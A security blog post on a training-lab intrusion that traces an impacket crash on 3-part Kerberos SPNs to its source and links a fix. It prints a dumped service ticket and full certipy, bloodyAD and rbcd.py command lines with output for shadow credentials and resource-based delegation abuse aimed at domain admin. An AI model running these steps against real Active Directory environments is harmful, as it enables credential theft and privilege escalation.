---
title: Fixing an impacket bug - how 3-part SPN service tickets can break most tools you use
categories: [research, AD, Kerberos]
tags: [research, AD, Kerberos]
render_with_liquid: false
---

## context

lately while playing with CRTE lab, I got administrator in one of the machines, and used `rubeus`'s `triage` module to check kerberos tickets cached in memory to find the following:
![rubeus_triage](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/research/AD/rubeus_triage.png)

the interesting user here was `mgmtadmin`, which had his TGT and and a service ticket for `LDAP` cached with an spn format that I haven't seen before, credentials guard was enabled on the machine with UEFI lock, so the TGT was out of the table, now it was the time to extract the service ticket

![rubeus_dump](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/research/AD/rubeus_ldap_dump.png)

`mgmtadmin` had a `genericWrite` on `US-HELPDESK$` computer object, this meant that there was 2 ways forward, either performing shadow credentials thanks to ADCS being in place, or configuing RBCD, me being more comfortable with linux, I transferd the ticket to my machine and converted it to .ccache to use with impacket, but to my surprise both attacks failed with the same error
```bash
$ echo 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 > ticket.b64
$ base64 -d ticket.b64 > ticket.kirbi
$ ticketConverter.py ticket.kirbi ticket.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
$ klist
Ticket cache: FILE:ticket.ccache
Default principal: mgmtadmin@US.TECHCORP.LOCAL

Valid starting       Expires              Service principal
07/29/2026 21:59:41  07/30/2026 07:49:50  LDAP/us-dc.us.techcorp.local/us.techcorp.local@US.TECHCORP.LOCAL
	renew until 08/05/2026 12:04:50
```

## tools failing

```bash
$ certipy -debug shadow auto -u mgmtadmin@US.TECHCORP.LOCAL -k -no-pass -account 'US-HELPDESK' -dc-ip 192.168.1.2 -target-ip 192.168.1.2 -target US-DC -dc-host US-DC
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: US.TECHCORP.LOCAL
[+] Username retrieved from CCache: mgmtadmin
[+] Nameserver: '192.168.1.2'
[+] DC IP: '192.168.1.2'
[+] DC Host: 'US-DC'
[+] Target IP: '192.168.1.2'
[+] Remote Name: 'US-DC'
[+] Domain: 'US.TECHCORP.LOCAL'
[+] Username: 'MGMTADMIN'
[+] Authenticating to LDAP server using Kerberos authentication
[+] Using LDAP channel binding for Kerberos authentication
[+] Checking for Kerberos ticket cache
[+] Loaded Kerberos cache from mgmtadmin.ccache
[-] Got error: list index out of range
Traceback (most recent call last):
  File "/usr/share/certipy/certipy/entry.py", line 67, in main
    actions[options.action](options)
    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/commands/parsers/shadow.py", line 30, in entry
    shadow.entry(options)
    ~~~~~~~~~~~~^^^^^^^^^
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/commands/shadow.py", line 846, in entry
    actions[options.shadow_action]()
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/commands/shadow.py", line 317, in auto
    user = self.connection.get_user(self.account)
           ^^^^^^^^^^^^^^^
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/commands/shadow.py", line 94, in connection
    self._connection.connect()
    ~~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/ldap.py", line 652, in connect
    self._kerberos_login(ldap_conn)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/ldap.py", line 868, in _kerberos_login
    cipher, session_key, blob, username = get_kerberos_type1(
                                          ~~~~~~~~~~~~~~~~~~^
        self.target,
        ^^^^^^^^^^^^
    ...<2 lines>...
        signing=self.target.ldap_signing and not connection.server.ssl,
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/kerberos.py", line 604, in get_kerberos_type1
    tgs, cipher, session_key, username, domain = get_tgs(target, target_name, service)
                                                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/certipy/lib/kerberos.py", line 758, in get_tgs
    creds = ccache.getCredential(principal)
  File "/usr/share/certipy/venv/lib/python3.14/site-packages/impacket/krb5/ccache.py", line 433, in getCredential
    cachedSPN = (c['server'].prettyPrint().upper().split(b'/')[1].split(b'@')[0].split(b':')[0] + b'@' + c['server'].prettyPrint().upper().split(b'/')[1].split(b'@')[1])
                                                                                                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^
IndexError: list index out of range
```

same thing with happened with `rbcd.py`

```bash
$ rbcd.py -debug us.techcorp.local/mgmtadmin -k -no-pass -delegate-to 'US-HELPDESK$' -delegate-from 'EVIL-PC$' -dc-ip 192.168.1.2 -action 'write' -use-ldaps
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/lib/python3.14/site-packages/impacket
[+] Using Kerberos Cache: mgmtadmin.ccache
[+] SPN LDAP/US-DC@US.TECHCORP.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
Traceback (most recent call last):
  File "/usr/bin/rbcd.py", line 317, in main
    ldap_server, ldap_session = init_ldap_session(domain, username, password, lmhash, nthash, args.k, args.dc_ip, args.dc_host, args.aesKey, args.use_ldaps)
                                ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.14/site-packages/impacket/examples/utils.py", line 247, in init_ldap_session
    return _init_ldap_connection(target, use_ldaps, domain, username, password, lmhash, nthash, k, dc_ip, aesKey)
  File "/usr/lib/python3.14/site-packages/impacket/examples/utils.py", line 225, in _init_ldap_connection
    ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, aesKey, kdcHost=dc_ip)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.14/site-packages/impacket/examples/utils.py", line 133, in ldap3_kerberos_login
    domain, user, TGT, TGS = CCache.parseFile(domain, user, target)
                             ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.14/site-packages/impacket/krb5/ccache.py", line 637, in parseFile
    creds = ccache.getCredential(principal)
  File "/usr/lib/python3.14/site-packages/impacket/krb5/ccache.py", line 433, in getCredential
    cachedSPN = (c['server'].prettyPrint().upper().split(b'/')[1].split(b'@')[0].split(b':')[0] + b'@' + c['server'].prettyPrint().upper().split(b'/')[1].split(b'@')[1])
                                                                                                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^
IndexError: list index out of range
[-] list index out of range
```

the attack perfectly worked with bloodyad tho so I knew the problem wasn't from my side
```
$ bloodyAD --host us-dc.us.techcorp.local -d US.TECHCORP.LOCAL -k --dc-ip 192.168.1.2   add shadowCredentials 'US-HELPDESK$'
[+] KeyCredential generated with following sha256 of RSA key: 01465bb4a193e91702fe253e5d49201f3fe89420520d84b6052d082e3294fb2f
[+] TGT stored in ccache file US-HELPDESK_rm.ccache

NT: [REDACTED]
```

A bit of googling told me that bloodyad uses minikerberos library instead of impacket, which led me to dig in impacket source code, in the part that was shown in the error

## understanding 3-part SPNs

long story short, I found something called [MS-KILE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9) (microsoft Kerberos Protocol Extensions) which describes microsoft implementation details on top of the standard kerberos v5 (RFC 4120), quoting the MS-KILE spec
```
An SPN is a string of the following format.

SPN = serviceclass "/" hostname [":"port] ["/" servicename]
```

the last `/servicename` part is optional, more digging shows that it's mostly used in multi-domains forest and mostly tied to ldap/GC (global catalog) queries

and the reason for that is when you request a service ticket for `http/cifs/host`, you get an spn tied to specific machines, there is no ambiguity `cifs/web01.lab.local`, even in multi domain forests, but when it comes to ldap a DC may contain data for multiple scopes, such as its own domain partition, forest-wide configuration partition, and in multi-domains forest it can represent different logical contexts depending on how you query it (e.g. Global Catalog queries span all domains in the forest, but a normal LDAP bind is scoped to just one domain)

per microsoft docs this also has the following [security implications](https://learn.microsoft.com/en-us/windows/win32/secauthn/using-three-part-principal-names):
> A domain joined client that logs on with a two part SPN may be able to impersonate the domain controller. If you allow two part SPNs, you should create a log entry that contains enough information to enable the administrator to identify the caller.

## the bug

impacket stores parsed Kerberos tickets in a `CCache` object, and whenever a tool needs a ticket for a specific service, it calls `CCache.getCredential(server, anySPN=True)`, This method first tries to find an exact match for the requested SPN, and if that fails (which is common, since tools often ask for a slightly different SPN format than what's actually cached), it falls back to looping over every cached credential and comparing SPNs manually to find the closest match. this is the anySPN fallback path, hence the the following lines in the output
```bash
[+] SPN LDAP/US-DC@US.TECHCORP.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
```

That loop in `impacket/krb5/ccache.py` is where the crash lives:
```python
        if anySPN is True:
            LOG.debug('AnySPN is True, looking for another suitable SPN')
            for c in self.credentials:
                # Let's search for any TGT/TGS that matches the server w/o the SPN's service type/port, returns
                # the first one
                # If server has no '/' we assume it's a ST from S4U2Self without a service type
                if c['server'].prettyPrint().find(b'/') >=0:
                    # Let's take the port out for comparison
                    cachedSPN = (c['server'].prettyPrint().upper().split(b'/')[1].split(b'@')[0].split(b':')[0] + b'@' + c['server'].prettyPrint().upper().split(b'/')[1].split(b'@')[1])
```

the problem is in the following part
```
c['server'].prettyPrint().upper().split(b'/')[1].split(b'@')[1])
```
impacket didn't account for the 3 parts spn, so with it being `LDAP/us-dc.us.techcorp.local/us.techcorp.local@US.TECHCORP.LOCAL` in this case the first `.split(b'/')[1]` returns `us-dc.us.techcorp.local`, since it's doesn't have `@` the second `split(b'@')[1]` throws an exception

and since impacket iterates over the tickets sequentially, just having a 3-parts SPN ticket cached will block you from using the other tickets that resides right after that one in the cache, as impacket will crash as soon as it tries to parse it

I've opened a [PR](https://github.com/fortra/impacket/pull/2242) that has been yet to get any responses, but if you need to use this before it gets merged you can apply the [following patch](https://patch-diff.githubusercontent.com/raw/fortra/impacket/pull/2242.patch)

after that the tools simply worked

### certipy

```
$ certipy  shadow auto -u mgmtadmin@US.TECHCORP.LOCAL -k -no-pass -account 'US-HELPDESK' -dc-ip 192.168.1.2 -target-ip 192.168.1.2 -target US-DC -dc-host US-DC
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'US-HELPDESK$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '52ac9525c49349ed8b9310c5c4401e20'
[*] Adding Key Credential with device ID '52ac9525c49349ed8b9310c5c4401e20' to the Key Credentials for 'US-HELPDESK$'
[*] Successfully added Key Credential with device ID '52ac9525c49349ed8b9310c5c4401e20' to the Key Credentials for 'US-HELPDESK$'
[*] Authenticating as 'US-HELPDESK$' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'us-helpdesk$@us.techcorp.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'us-helpdesk.ccache'
[*] Wrote credential cache to 'us-helpdesk.ccache'
[*] Trying to retrieve NT hash for 'us-helpdesk$'
[*] Restoring the old Key Credentials for 'US-HELPDESK$'
[*] Successfully restored the old Key Credentials for 'US-HELPDESK$'
[*] NT hash for 'US-HELPDESK$': [REDACTED]
```

### rbcd.py

```
$ rbcd.py  us.techcorp.local/mgmtadmin -k -no-pass -delegate-to 'US-HELPDESK$' -delegate-from 'EVIL-PC$' -dc-ip 192.168.1.2 -action 'write' -use-ldaps
Impacket v0.14.0.dev0+20260730.15419.c1c4d6ad - Copyright Fortra, LLC and its affiliated companies

[*] Getting machine hostname
[*] Accounts allowed to act on behalf of other identity:
[-] SID not found in LDAP: S-1-5-21-3753023061-306865128-3498081829-10105
[*] Delegation rights modified successfully!
[*] EVIL-PC$ can now impersonate users on US-HELPDESK$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[-] SID not found in LDAP: S-1-5-21-3753023061-306865128-3498081829-10105
[*]     EVIL-PC$     (S-1-5-21-3753023061-306865128-3498081829-34602)
```

## few words
this might be a small bug but in my case it was the thing that stood between me and getting domain administrator, it's also another reason why it's better to know how multiple ways/tools to do the same thing, and not to overlook tool errors
